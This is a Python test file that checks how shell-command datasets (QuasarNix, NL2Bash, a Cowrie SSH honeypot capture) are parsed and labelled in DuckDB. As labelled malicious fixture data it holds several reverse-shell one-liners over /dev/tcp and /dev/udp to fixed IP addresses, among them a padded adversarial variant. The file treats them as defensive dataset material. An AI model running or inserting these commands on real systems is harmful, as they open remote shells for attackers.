"""Authentic source excerpts exercise full ingest paths and dependency assumptions."""
import io
import json
import subprocess
import sys
import tarfile
from pathlib import Path

import duckdb

ROOT = Path(__file__).resolve().parent


def _ingest(root, module, database):
    driver = root / 'driver.py'
    driver.write_text(f'import sys\nfrom pathlib import Path\nsys.path.insert(0,{str(ROOT)!r})\n'
                      f'from {module} import records\nfrom _ingest import run\nrun(Path(__file__).parent, records)\n')
    return subprocess.run([sys.executable, str(driver), '--db', str(database)], capture_output=True, text=True, check=False)


def test_quasarnix_release_excerpts(tmp_path):
    """Do not lose leading shell options or confuse adversarial print padding with attacks."""
    from _ingest_quasarnix import FILES
    root = tmp_path / 'quasarnix'
    root.mkdir()
    # First original and fourth adversarial strings, at the pinned publisher revision.
    original = 'sh -i >& /dev/tcp/10.164.246.227/53 0>&1'
    adversarial = 'python3 -c "print(\'find . -depth -type f -not -name *.itp -and -not -name *ane.gro -and -not -name *.top -ex\')" ;/usr/bin/dash -i -l >& /dev/udp/10.236.143.216/22 0>&1'
    for name in FILES:
        (root / name).write_text(json.dumps([adversarial if '_adv' in name else original]))
    # Actual NL2Bash invalid escape form; decoding must retain the backslash.
    (root / 'nl2bash.json').write_text('["find . -name \\!", "printf \'line\nnext\'"]')
    db = tmp_path / 'commands.duckdb'
    first = _ingest(root, '_ingest_quasarnix', db)
    assert first.returncode == 0, first.stderr
    second = _ingest(root, '_ingest_quasarnix', db)
    assert json.loads(second.stdout)['skipped']
    with duckdb.connect(str(db)) as con:
        assert con.execute("SELECT label,count(*) FROM COMMANDS GROUP BY label ORDER BY label").fetchall() == [('malicious', 4), ('benign', 4)]
        assert con.execute("SELECT args,other_tokens FROM COMMANDS WHERE record_id='X_train_malicious_cmd_orig.json:0:0'").fetchone() == (['-i'], ['>&', '/dev/tcp/10.164.246.227/53', '0', '>&', '1'])
        assert con.execute("SELECT shell_input FROM COMMANDS WHERE record_id='nl2bash.json:0:0'").fetchone() == ('find . -name \\!',)
        assert con.execute('SELECT count(DISTINCT session_id), count(*) FROM COMMANDS').fetchone() == (8, 8)


def _archive(root, files):
    with tarfile.open(root / 'release.tar.gz', 'w:gz') as archive:
        for name, rows in files.items():
            data = ''.join(json.dumps(row) + '\n' for row in rows).encode()
            member = tarfile.TarInfo('release/' + name)
            member.size = len(data)
            archive.addfile(member, io.BytesIO(data))


def test_honeypot_occurrences_connections_and_responses(tmp_path):
    """Keep unmatched repeated commands and IP groups separate from connections."""
    root = tmp_path / 'shell-honeypot'
    root.mkdir()
    # Field layout and command are from the first published 2024 raw capture.
    common = {'src_host': '170.64.148.44', 'src_port': '48702', 'dst_host': '104.238.182.124', 'dst_port': '22', 'protocol': 'ssh'}
    command = dict(common, info='command.input', tshark='INPUT_COMD: uname -s -v -n -r -m', timestamp='2024-03-01 00:00:01')
    raw = [dict(common, info='session.connect', tshark='New connection [session: abc123]', timestamp='2024-03-01 00:00:00'), command,
           dict(common, info='response', tshark='root Linux', timestamp='2024-03-01 00:00:02'),
           dict(common, info='session.closed', timestamp='2024-03-01 00:00:03'),
           dict(command, timestamp='2024-03-01 00:00:04')]
    cleaned = {'session_id': '03d51db6da14', 'period': '2024', 'src_ip': '170.64.148.44', 'commands': ['uname -s -v -n -r -m'] * 3}
    _archive(root, {'2024/cowrie/ssh_03_01.json': raw,
                    'dataset/raw_samples/cowrie_ssh_2024_sample.jsonl': [command],
                    'dataset/sessions/2024.jsonl': [cleaned],
                    'dataset/sessions/2021_2022.jsonl': [dict(cleaned, period='2021_2022', commands=['id'])],
                    'dataset/request_response/curated.jsonl': [{'command': 'uname -s -v -n -r -m', 'severity_vi': 0}]})
    db = tmp_path / 'commands.duckdb'
    result = _ingest(root, '_ingest_shell_honeypot', db)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(db)) as con:
        rows = con.execute('SELECT pgm,args,label,group_id,session_id FROM COMMANDS ORDER BY record_id').fetchall()
        assert len(rows) == 4, 'Raw coverage may only suppress matching cleaned occurrences, including multiplicity'
        assert {r[0] for r in rows} == {'uname', 'id'}, 'Responses must never become commands'
        assert all(r[2] == 'malicious-group' for r in rows), 'Severity zero is not a benign annotation'
        assert sum(r[4] == 'shell-honeypot:2024:abc123' for r in rows) == 1
        assert sum(':record:' in r[4] for r in rows) == 3
        assert all(r[3] != r[4] for r in rows), 'An attacker-IP group is not a login session'
    again = _ingest(root, '_ingest_shell_honeypot', db)
    assert json.loads(again.stdout)['skipped']


def test_honeypot_complete_capture_formats(tmp_path):
    """The full release uses plain input and byte-literal wrappers, unlike its sample."""
    root = tmp_path / 'shell-honeypot'
    root.mkdir()
    common = {'src_host': '170.64.148.44', 'src_port': 48702, 'dst_host': '104.238.182.124', 'dst_port': '22', 'protocol': 'ssh'}
    raw = [dict(common, info='command.input', tshark="command  found [ b'uname -s -v -n -r -m ']", timestamp='2024-03-01 00:00:03.635933'),
           dict(common, info='command.input', tshark='uname -s -v -n -r -m', timestamp='2024-03-01 00:00:04'),
           dict(common, info='command.process', tshark="command  found [ b'uname -s -v -n -r -m ']", timestamp='2024-03-01 00:00:04.001')]
    cleaned = {'session_id': '03d51db6da14', 'period': '2024', 'src_ip': '170.64.148.44', 'commands': ['uname -s -v -n -r -m']}
    _archive(root, {'2024/cowrie/ssh_03_01.json': raw, 'dataset/sessions/2024.jsonl': [cleaned]})
    db = tmp_path / 'commands.duckdb'
    result = _ingest(root, '_ingest_shell_honeypot', db)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(db)) as con:
        assert con.execute('SELECT pgm,args,shell_input FROM COMMANDS ORDER BY record_id').fetchall() == [
            ('uname', ['-s', '-v', '-n', '-r', '-m'], 'uname -s -v -n -r -m '),
            ('uname', ['-s', '-v', '-n', '-r', '-m'], 'uname -s -v -n -r -m')], 'Read original input once; process echoes must not duplicate it'


def test_quasarnix_padding_mentions_socket(tmp_path):
    """A data word in padding is not evidence of an interpreter opening a socket."""
    from _ingest_quasarnix import FILES
    root = tmp_path / 'quasarnix'
    root.mkdir()
    for name in FILES:
        (root / name).write_text('[]')
    text = 'echo socket; cat /tmp/socket; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
    (root / FILES[0]).write_text(json.dumps([text]))
    db = tmp_path / 'commands.duckdb'
    result = _ingest(root, '_ingest_quasarnix', db)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(db)) as con:
        assert con.execute('SELECT pgm,label FROM COMMANDS ORDER BY record_id').fetchall() == [
            ('echo', 'malicious-group'), ('cat', 'malicious-group'), ('bash', 'malicious')]
